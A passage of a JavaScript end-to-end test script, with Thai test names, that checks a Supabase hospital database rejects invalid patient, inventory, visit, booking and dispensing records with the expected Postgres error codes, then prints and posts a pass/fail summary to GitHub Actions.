  ['เพิ่มคนไข้ไม่มี HN', () => sb.from('patient').insert({ national_id: '1111111111119', first_name: 'a', last_name: 'b' }), '23502'],
  ['email ซ้ำกับคนอื่น', () => sb.from('patient').update({ email: twoEmails[1].email }).eq('patient_id', twoEmails[0].patient_id), '23505'],
  ['stock ติดลบ', () => sb.from('inventory').update({ quantity_on_hand: -1 }).gt('inventory_id', 0), '23514'],
  ['discharge ก่อน admit', () => sb.from('visit').update({ discharge_date: '2000-01-01T00:00:00Z' }).gt('visit_id', 0), '23514'],
  ['จองโดยใช้เภสัชกรเป็นหมอ (trigger)', () => sb.from('booking').insert({ patient_id: pWithVisit, staff_id: STAFF.pharmacist, booking_date: '2026-12-25', booking_time: '10:00', queue_no: 1 }), '23514'],
  ['จ่ายยาโดยหมอ (trigger)', () => sb.from('dispense_record').insert({ item_id: idOf('select min(item_id) from prescription_item'), staff_id: STAFF.doctor,
    lot_id: idOf('select min(lot_id) from drug_lot'), dispensed_quantity: 1, status_code: 'DP' }), '23514'],
];
for (const [name, fn, code] of crud) { const r = await fn();
  check(C, name, `${code} → "${friendlyError({ code })}"`, `${r.error?.code ?? 'สำเร็จ!'} → "${friendlyError(r.error)}"`, r.error?.code === code); }
check(C, 'ข้อมูลหลักไม่ถูกแก้หลังทดสอบ', `patient=${PATIENT_COUNT}, ตาราง 22`, `patient=${sql('select count(*) from patient')}, ตาราง ${sql("select count(*) from pg_tables where schemaname='public'")}`,
  sql('select count(*) from patient') === PATIENT_COUNT && sql("select count(*) from pg_tables where schemaname='public'") === '22');

// ---------- report ----------
mock.close();
const cats = [...new Set(results.map((r) => r.cat))];
const failed = results.filter((r) => !r.ok);
for (const c of cats) { const rs = results.filter((r) => r.cat === c); console.log(`${c}: ${rs.filter((r) => r.ok).length}/${rs.length}`); }
for (const r of failed) console.log(`FAIL [${r.cat}] ${r.name}\n   expect: ${r.expect}\n   actual: ${r.actual}`);
console.log(failed.length ? `\n${failed.length} of ${results.length} cases failed` : `\nall ${results.length} cases passed`);
if (process.env.GITHUB_STEP_SUMMARY) {
  const esc = (s) => String(s).replace(/\|/g, '\\|').replace(/\n/g, ' ');
  let md = `## Supabase e2e: ${results.length - failed.length}/${results.length} ผ่าน\n\n`;
  for (const c of cats) {
    md += `<details${results.some((r) => r.cat === c && !r.ok) ? ' open' : ''}><summary>${c}</summary>\n\n| กรณีทดสอบ | คาดหวัง | ผลจริง | ผล |\n| --- | --- | --- | --- |\n`;
    for (const r of results.filter((x) => x.cat === c)) md += `| ${esc(r.name)} | ${esc(r.expect)} | ${esc(r.actual)} | ${r.ok ? '✅' : '❌'} |\n`;
    md += '\n</details>\n\n';
  }
  appendFileSync(process.env.GITHUB_STEP_SUMMARY, md);
}
process.exit(failed.length ? 1 : 0);
